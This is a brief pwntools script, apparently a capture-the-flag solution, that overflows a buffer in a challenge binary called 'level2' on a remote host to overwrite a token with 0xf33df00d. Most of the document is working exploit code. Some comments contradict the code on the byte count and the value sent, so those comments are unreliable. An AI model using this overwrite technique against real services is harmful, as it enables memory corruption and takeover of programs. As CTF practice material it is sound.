from pwn import *

# Init the binary file
elf = ELF('./level2')

# Start the local file or connect to remote
# io = elf.process()
io = remote('3.85.17.84', '1271')

# Exact number of bytes before the token
# Found using:
# 1. 'pwn cyclic 50' to generate a pattern
# 2. send pattern into file
# 3. copy the value of token
# 4. 'pwn cyclic -l 0x<token_value>
offset = 24

# Send 28 bytes to reach the token
# Sends 0xfeedf00d to change the value of token
# p32 is used to pack the value to work with the binary
io.sendline(b'a'*offset + p32(0xf33df00d))

# Opens the process in the terminal to see the output and interact
io.interactive()
